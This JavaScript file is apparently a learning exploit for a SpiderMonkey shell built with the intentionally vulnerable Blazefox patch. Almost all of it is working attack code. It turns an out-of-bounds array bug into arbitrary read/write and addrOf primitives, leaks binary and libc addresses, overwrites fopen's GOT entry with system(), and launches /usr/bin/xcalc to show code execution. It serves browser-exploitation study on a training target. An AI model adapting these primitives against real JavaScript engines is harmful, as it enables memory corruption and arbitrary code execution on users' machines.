// this exploit is for the Spidermonkey shell built with the Blazefox patch
// not all of the steps here are necessary for exploitation; I've tried to
// put in some additional effort to make the exploit more stable in order to
// simulate a real exploitation scenario
// I've drawn ideas and code snippets from several sources, including:
// https://blog.infosectcbr.com.au/2020/01/firefox-spidermonkey-js-engine.html
// https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/

// these paths are relative to the Spidermonkey shell location
// these are Saelo's libraries
load('../../../../../../utils.js');
load('../../../../../../int64.js');

const Address = Math.atan2; // use for setting an easy breakpoint on js::math_atan2

// addr_to_read can be passed as a hex value, e.g. 0x41414141
// this function leaks a single byte at a time, so I use a for loop to leak a full qword
// a version that only reads a 32-bit value could be implemented by changing the for loop to be i = 3 instead of i = 7
function arb_read64(addr_to_read){

	function get_byte(addr_to_read,target_byte){
		var saved_pointer = blz[13]; // back up the pointer so it can be restored later
		address = new Int64(addr_to_read); // comes from Saelo's libraries

		// now overwrite the backing store buffer
		blz[13] = address.asDouble(); // comes from Saelo's libraries

		// view the contents of the typed array
		leak = target[target_byte];

		blz[13] = saved_pointer; // restore the overwritten backing store pointer
		return leak;
	}

	// use a for loop to extract every byte
	// there's almost certainly a more elegant solution than this, but it works
	var i;
	var final_leak = "";
	for(i = 7; i >= 0; i--){
		leaked_byte = get_byte(addr_to_read,i);
		// uncomment below to see each byte you're leaking individually
		//console.log("The leaked byte is", leaked_byte);
		final_leak += leaked_byte.toString(16);
	}
	return final_leak;
}

// also only writes one byte at a time, hence the for loop
function arb_write(target_addr,value_to_write){

	function write_byte(target_addr, to_write, target_byte){
        var saved_pointer = blz[13];
        address = new Int64(target_addr); // comes from Saelo's libraries

        // now overwrite the backing store buffer
		blz[13] = address.asDouble(); // comes from Saelo's libraries
		
        // write to the targeted address
        target[target_byte] = to_write;

		blz[13] = saved_pointer; // restore the overwritten backing store pointer
	}

	var bytes = 18;
	var i;
	var target_byte = 0;

	// again, there must be a cleaner way to do this
	for(i = 0; i <= 7; i++){
		next_byte = value_to_write.toString(16).slice(2,bytes);
		//uncomment below to see each byte you're overwriting individually
		//console.log("The next byte is", next_byte);
		bytes -= 2;
		to_write = parseInt(next_byte,16);
		//uncomment below to see each byte you're writing individually
		//console.log("The value to write is", to_write);
		write_byte(target_addr,to_write,target_byte);
		target_byte += 1;
	}
}

function addrOf_primitive(target_object){

// index 14 is one qword past the backing store pointer, which should be the actual backing store
blz[14] = target_object; // overwrite the backing store of the typed array past the vulnerable object

// uncomment below lines for debug info
//console.log(objectAddress(target));
//Address(blz);

//console.log(target.slice(0,8)); // this outputs the 6 bytes for the object plus the two for the jsval nan-box
//console.log(objectAddress(test_array));

// now try reading from the backing store and reassembling it into a JSVal
var i;
var jsval = "";

// the two most significant bytes will be the NaN-boxed values, so just don't include them
for(i = 5; i >= 0; i--){

	// leading zeros get dropped by the toString function, so
	// check the range of 0-15 and add a 0 if the number falls within that range
	if(target.slice(0,8)[i] <= 15){
		jsval += "0" + (target.slice(0,8)[i]).toString(16);
		continue;
	}
	jsval += (target.slice(0,8)[i]).toString(16);
}

// uncomment the below lines for more debug info
//console.log("The extracted jsval is 0x" + jsval);
//console.log(parseInt(jsval,16))

// return the object address in numeric form
return parseInt(jsval,16);
}

console.log("[*] STAGE 1: Use initial OOB access to gain arbitrary r/w");

var blz = new Array(1.1,2.2,3.3); // has to be declared like this instead of var blz = [...] in order to be allocated contiguously with the typed array. I don't know why
var target = new Uint8Array(8);
target[0] = 0x41;
target[1] = 0x42;
target[2] = 0x43;
target[4] = 0x44;
// fill out the buffer; I think this is useful if the raw memory buffer is going to be written to at some point
target[5] = 0x45;
target[6] = 0x46;
target[7] = 0x47;

// these are useful for debugging, but not necessary; they'll just print out the addresses of the object
//console.log(objectAddress(blz));
//console.log(objectAddress(target));

blz.blaze(); // now use the Blazefox patch vulnerability to extend the length field of the array to 420 indices
backing_store_pointer = Int64.fromDouble(blz[13]); // this is the pointer to the backing store buffer
elements_text_pointer = Int64.fromDouble(blz[9]); // should be the elements_ pointer of the typed array; use to figure out base of binary by leaking .text address
native_function_pointer = elements_text_pointer - 16; // the elements_ pointer is 16 bytes into a native function, which is why I'm subtracting 16 here

// offset between the native function pointer and the image base is 0xadf650
image_base = native_function_pointer - 0xadf650;

// now calculate the addresses of the target GOT entries
gettimeofday_got = image_base + 0x181b518;
fopen_got = image_base + 0x181b068;

libc_leak = arb_read64(fopen_got);

console.log("---------------------------------------------------");
console.log("[*] LEAKS:");

console.log("The final libc leak string is 0x" + libc_leak);
numeric_libc_leak = parseInt(libc_leak,16); // turn this into an int to do some math

// offset from fopen() to system() is - 0x2f3d0
system_libc = numeric_libc_leak - 0x2f3d0
converted_system = new Int64(system_libc);

// output all the calculations
console.log("Backing store pointer is", backing_store_pointer);
console.log("The elements_ pointer of the typed array is", elements_text_pointer);
console.log("emptyElementsHeader() is 0x" + native_function_pointer.toString(16));
console.log("Image base is 0x" + image_base.toString(16));
console.log("gettimeofday's GOT entry is 0x" + gettimeofday_got.toString(16));
console.log("fopen's GOT entry is 0x" + fopen_got.toString(16));
console.log("The libc address of system() is 0x" + system_libc.toString(16));

console.log("---------------------------------------------------");


// We're going to move the arb r/w from the more volatile array and Typed Array in the nursery heap
// to ArrayBuffers, which will be placed on the tenured heap right away and should stay there
// use the addrOf primitive to find out where they are, then 
// use the initial r/w to corrupt an ArrayBuffer's length field to start manipulating the second 
// ArrayBuffer
// NOTE: This stage is pretty much totally unnecessary in the Spidermonkey shell if you just want to get a working
// exploit, but this simulates a more realistic scenario in which you'd want your exploit to be as stable as possible
// (and I got to learn about ArrayBuffers while writing it)

console.log("[*] STAGE 2: Use the arbitrary r/w to migrate to new primitives via ArrayBuffers, which are on the tenured heap and are less volatile");

// these will be allocated contiguously on the tenured heap
vuln_arraybuf = new ArrayBuffer(1);
r_w_arraybuf = new ArrayBuffer(1);

// now use the addrOf primitive to leak the addresses of the ArrayBuffers
leaked_vuln_arraybuf = addrOf_primitive(vuln_arraybuf);
leaked_r_w_arraybuf = addrOf_primitive(r_w_arraybuf);

console.log("The leaked vuln arraybuf is", leaked_vuln_arraybuf.toString(16));
console.log("The leaked r/w arraybuf is", leaked_r_w_arraybuf.toString(16));

// the BYTE_LENGTH_SLOT of an ArrayBuffer is located at an offset of ArrayBuffer + 0x28
// that's what we'll want to corrupt on the ArrayBuffers to provide OOB primitives
// don't forget that we need to write a NaN-boxed size, so it should start with 0xfff880
arraybuf_overwrite = new Int64(0xfff8800000100000)
arb_write((leaked_vuln_arraybuf + 0x28),arraybuf_overwrite);
arb_write((leaked_r_w_arraybuf + 0x28),arraybuf_overwrite);

// try using the corrupted size to write from a typed array view 
// over the second ArrayBuffer's backing store pointer
const vuln_arraybuf_view = new Uint8Array(vuln_arraybuf);

// it should now be possible to start performing r/w operations from the first
// ArrayBuffer into the second

// use this to modify the backing store pointer of the second ArrayBuffer
// this function can be followed up with a read, write, or addrOf primitive
// once it's changed, it should be possible to write into wherever it points (instead of just even numbers); that's
// a TODO for now
function prep_write_arraybuffer(target_addr){

	function write_byte(target_byte){

		vuln_arraybuf_view[target_byte] = to_write;
	}

	// I need to figure out how to deal with odd numbers, but for now I'll just leave it (bitshifting will lose some content
  // for odd numbers, I'm told)
	if((target_addr % 2) != 0){
		console.log("The provided address is an odd number");
	}

	var bytes = 18;
	var i;
	// we'll want to start at index 64, since we're writing from the size-corrupted first ArrayBuffer
	var target_byte = 64;

	for(i = 0; i <= 7; i++){
		next_byte = (RShift1(target_addr)).toString(16).slice(2,bytes);
		//uncomment below to see each byte you're overwriting individually
		//console.log("The next byte is", next_byte);
		bytes -= 2;
		to_write = parseInt(next_byte,16);
		//uncomment below to see each byte you're writing individually
		//console.log("The value to write is", to_write);
		write_byte(target_byte);
		target_byte += 1;
	}
}



// in this function, just before the loop I declare a temporary TypedArray that's a view
// into the second ArrayBuffer, which should allow me to write into it
function arb_write_arraybuffer(value_to_write){

	function write_byte(to_write, target_byte){

		// write to the targeted address that's held in the corrupted
		// backing store pointer of the second ArrayBuffer
        r_w_arraybuf_view[target_byte] = to_write;
	}

	// declare the Typed Array view we'll use for writing via the corrupted
	// second ArrayBuffer
	const r_w_arraybuf_view = new Uint8Array(r_w_arraybuf);

	var bytes = 18;
	var i;
	var target_byte = 0;

	// again, there must be a cleaner way to do this
	for(i = 0; i <= 7; i++){
		next_byte = value_to_write.toString(16).slice(2,bytes);
		//uncomment below to see each byte you're overwriting individually
		//console.log("The next byte is", next_byte);
		bytes -= 2;
		to_write = parseInt(next_byte,16);
		//uncomment below to see each byte you're writing individually
		//console.log("The value to write is", to_write);
		write_byte(to_write,target_byte);
		target_byte += 1;
	}
}

// now create a read primitive
// a good TODO would probably be to make the read primitive use the prep primitive to modify
// the backing store pointer, perform the read, and then restore everything
// as it is, I need to call each function individually in order, which is fine, but
// could be made sleeker
function arb_read_arraybuffer(jsval = 0){

	function get_byte(target_byte){

		// view the contents of the ArrayBuffer's corrupted backing store pointer
		leak = r_w_arraybuf_view[target_byte];
		return leak;
	}

	// declare the Typed Array view we'll use for reading via the corrupted
	// second ArrayBuffer
	const r_w_arraybuf_view = new Uint8Array(r_w_arraybuf);

	// use a for loop to extract every byte
	// there's almost certainly a more elegant solution than this, but it works
	var i;
	var final_leak = "";

	// only read 6 bytes if this is being used as an addrOf read, since the last two will be for NaN-boxing purposes
	if(jsval == 1){
		console.log("Reading a JSVal...");
		for(i = 5; i >= 0; i--){
			leaked_byte = get_byte(i);
			// uncomment below to see each byte you're leaking individually
			//console.log("The leaked byte is", leaked_byte);
			final_leak += leaked_byte.toString(16);
		}
		return final_leak;
	}

	for(i = 7; i >= 0; i--){
		leaked_byte = get_byte(i);
		// uncomment below to see each byte you're leaking individually
		//console.log("The leaked byte is", leaked_byte);
		final_leak += leaked_byte.toString(16);
	}
	return final_leak;
}

function addrOf_arraybuffer_primitive(object_to_leak){	
	// set the object to leak as a property of the ArrayBuffer
	// this gets it placed into the area the ArrayBuffer's slots_ array points to
	r_w_arraybuf.object_to_leak = object_to_leak;
	// use the position of the slots_ pointer relative to the address of the ArrayBuffer
	var addressOfSlotsArray = (leaked_r_w_arraybuf + 16);

	// I could also implement pointer restoring for the prep function to make this cleaner
	// the pointer to the slots array needs to be deferenced twice to get to the object address
	// first, leak the pointer to the property
	prep_write_arraybuffer(addressOfSlotsArray);
	slots_leak = arb_read_arraybuffer();
	// now leak the JSVal itself
	prep_write_arraybuffer(slots_leak);

	// use the optional argument to tell arb_read_arraybuffer() to read a JSVal instead of a normal address
	addrOf_leak = arb_read_arraybuffer(1);
	return addrOf_leak;
}

console.log("[*] STAGE 3: With the r/w primitives migration complete, it's now time to gain code execution");

// the prep function is used to initially change the backing store pointer
// this function can be followed up with a read, write, or addrOf primitive
console.log("Trying to use the first ArrayBuffer to corrupt the second's backing store pointer...");

// try overwriting the fopen GOT entry with system()'s libc address
prep_write_arraybuffer(fopen_got);
arb_write_arraybuffer(converted_system);

console.log("GOT overwrite complete");

// now try to get code execution by using the load() function, which uses the hijacked fopen() GOT entry
console.log("Trying to get code exec...")
load("/usr/bin/xcalc");
// the GOT entry could be restored with another write for process continuation if desired (but it's not really necessary when exploiting just the Spidermonkey shell)
